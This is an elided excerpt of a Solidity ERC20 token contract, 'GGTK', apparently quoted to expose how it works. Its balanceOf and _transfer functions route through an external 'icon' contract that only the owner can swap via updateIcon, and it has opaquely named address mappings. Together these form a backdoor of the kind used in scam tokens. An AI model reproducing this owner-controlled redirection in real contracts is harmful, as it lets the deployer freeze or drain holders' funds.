...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    function balanceOf(address account) public view override returns (uint256) {
        bytes memory returndata = icon.functionStaticCall(abi.encodeWithSelector(0x70a08231, account));
    ...
    function _transfer(
        ...
        bytes memory returndata = icon.functionCall(abi.encodeWithSelector(0x23b872dd, from, to, amount), "SafeERC20: low-level call failed");
        if (returndata.length > 0) {
...
contract GGTK is ERC20,ReentrancyGuard {
    ...
    uint private constant TOTAL = 1_000_000_000 * 10 ** _decimals;
    mapping(address => bool) private aL;
    mapping(address => bool) private bL;
    mapping(address => bool) private cL;
    mapping(address => bool) private dL;
    mapping(address => bool) private eL;
    mapping(address => bool) private fL;
    modifier Author() {
        require(owner==_msgSender(), "Error Call");
        _;
    }
    ...
    function updateIcon(address addr) public Author{
        icon = address(addr);
    }
